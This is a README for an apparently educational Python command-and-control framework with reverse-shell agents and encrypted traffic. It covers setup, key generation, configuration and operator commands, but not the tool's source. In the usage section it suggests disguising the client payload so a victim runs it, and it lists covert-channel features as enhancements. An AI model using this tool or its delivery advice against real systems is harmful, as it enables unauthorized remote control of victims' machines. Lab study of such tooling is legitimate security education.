# Encrypted C2 Framework (Educational Project)

A simple, educational Command and Control (C2) framework built with Python. This project demonstrates core red teaming concepts including client-server architecture, reverse shell communication, multi-threading, and secure encrypted data transfer.

This project was developed for educational purposes to understand the inner workings of C2 infrastructure and is to be used only in controlled, legal lab environments.

**Disclaimer: Do not use this tool on any system or network without explicit, written permission. The author is not responsible for any misuse or damage caused by this software.**

## Features

* **Client-Server Architecture:** A central server manages multiple connected clients (agents).
* **Reverse Shell:** Clients initiate connections back to the server, making it effective for bypassing some firewall rules.
* **Multi-Client Handling:** The server uses multi-threading to handle connections from multiple agents simultaneously.
* **Encrypted Communication:** All commands and outputs are encrypted using symmetric AES encryption (`cryptography.fernet`) to prevent plaintext data from being intercepted by network sniffers.
* **Reliable Data Transfer:** Implements a length-prefixing protocol to ensure complete and reliable data transmission over the socket.
* **Improved Interactive Shell:** The client handles stateful commands like `cd` directly, providing a better user experience.

## Setup and Installation

### 1. **Prerequisites**

You need Python 3 installed on both your C2 server and client machines.

Install the required Python library:

```bash
pip install cryptography
```
### 2. **Lab Environment**

Set up a controlled network lab environment using virtual machines (e.g., VirtualBox, VMware, or Proxmox). You will need at least two machines:

* **Server Machine (Controller):** Your C2 server (e.g., Kali Linux, Ubuntu).
* **Client Machine (Agent/Victim):** The target machine where the client payload will run (e.g., Windows, Ubuntu).

Make sure the client machine can connect to the server machine over the network on the chosen port (**4444** by default).

### 3. **Generate Encryption Key**

Security is paramount. First, you need to generate a unique encryption key. Run the following Python script **once** on any machine:

```bash
# generate_key.py
from cryptography.fernet import Fernet
key = Fernet.generate_key()
print("Generated Key:", key.decode())
```

Copy the output key (e.g., **b'g_X4...='**). This is your secret key. Do not share it.

### 4. **Configuration**

Paste your generated key into the **ENCRYPTION_KEY** variable in both c2_server.py and c2_client.py.

**C2_server.py**

```bash
# ...
ENCRYPTION_KEY = b'PASTE_YOUR_GENERATED_KEY_HERE_AS_BYTES' 
# ...
```
**C2_client.py**

```bash
# ...
# IMPORTANT: Replace 'YOUR_C2_SERVER_IP' with your server's IP address.
HOST = 'YOUR_C2_SERVER_IP' 
PORT = 4444
# PASTE YOUR GENERATED KEY HERE IN BYTES FORMAT (b'...')
ENCRYPTION_KEY = b'PASTE_YOUR_GENERATED_KEY_HERE_AS_BYTES' 
# ...
```

### Usage

### 1. **Start the Server**

On your server machine, run the server script from your terminal:

```bash
python3 C2_server.py
```
The server will start listening for connections on the configured port.

```bash
[*] C2 server listening on 0.0.0.0:4444
```

### 2. **Run the client payload**

On your client machine, run the client script: (Try to deliver it in any masking way so that client will execute it)

```bash
python3 C2_client.py
```
The client will attempt to connect back to the C2 server.

```bash
[*] Attempting to connect to YOUR_C2_SERVER_IP:4444...
[*] Connected to C2 server at YOUR_C2_SERVER_IP:4444
```

### 3. **C2 Framework Commands**

This table provides a quick reference for the commands used to interact with the C2 server and its connected agents.

| Command | Description |
|---|---|
| `list` | Lists all connected agents with their IDs and IP addresses. |
| `interact <client_id>` | Enters a shell-like mode to send commands to a specific client. |
| `back` | (Inside `interact` mode) Returns to the main C2 command menu. |
| `exit` | Shuts down the C2 server and all active client connections. |

### Ethical Consideration and Security

This tool is created for **academic and ethical hacking** purposes only. The code should be used exclusively in isolated lab environments where you have full control and permission.

* **Legal Compliance:** Never use this code to access or control systems you do not own or have explicit authorization to test. Unauthorized access to computer systems is a crime.
* **Responsible Disclosure:** If you find vulnerabilities in real systems, follow responsible disclosure guidelines.
* **Security Best Practices:** The key is hardcoded in the script, which is a major security risk in real-world deployments. A production-ready tool would load the key from a secure configuration file or environment variable.
* **Evading Detection:** While encryption helps, this tool is still easily detectable by modern EDR and network security solutions due to its direct socket communication and use of **subprocess.run**. Real-world red teaming tools use more sophisticated evasion techniques.

### Contribution

Feel free to fork this repository, add features, or improve the code. Suggestions for enhancements are welcome, such as:

* Adding file upload/download capabilities.

* Implementing screenshot functionality.

* Using HTTPS for covert communication.

* Adding a more sophisticated command parser.

* Improving multi-client management.

### License 
This project is licensed under the MIT License.
